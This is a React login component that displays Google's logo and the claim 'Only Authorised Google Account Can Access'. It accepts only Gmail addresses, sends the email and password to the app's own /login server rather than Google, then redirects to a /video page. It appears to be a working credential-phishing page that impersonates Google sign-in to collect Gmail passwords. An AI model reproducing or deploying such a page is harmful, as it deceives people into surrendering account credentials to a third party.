import React, { useState } from "react";
import API from "../api";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const isValidGmail = (email) => {
    return email.endsWith("@gmail.com");
  };

  const handleLogin = async () => {
    setError("");

    if (!email || !password) {
      setError("Enter all details");
      return;
    }

    if (!isValidGmail(email)) {
      setError("Please enter a valid Gmail address (@gmail.com)");
      return;
    }

    if (password.length < 6) {
      setError("Fill The Correct Details");
      return;
    }

    try {
      setLoading(true);
      const res = await API.post("/login", { email, password });
      localStorage.setItem("token", res.data.token);
      window.location.href = "/video";
    } catch (error) {
      console.error("Login error:", error);
      setError(error.response?.data?.message || "Login failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-wrapper">
      <div className="login-card">
        <img
          src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
          alt="Google"
        />
        <h2>Verified Access</h2>
        <p>Only Authorised Google Account Can Access. </p>

        {error && <p style={{ color: "red", fontSize: "14px" }}>{error}</p>}

        <input
          placeholder="Gmail Address"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          type="email"
        />
        
        <div className="password-input-wrapper">
          <input
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type={showPassword ? "text" : "password"}
          />
          <button
            type="button"
            className="toggle-password"
            onClick={() => setShowPassword(!showPassword)}
          >
            {showPassword ? "👁️" : "👁️‍🗨️"}
          </button>
        </div>

        <button onClick={handleLogin} disabled={loading}>
          {loading ? "Verifying..." : "Continue"}
        </button>
      </div>
    </div>
  );
}






















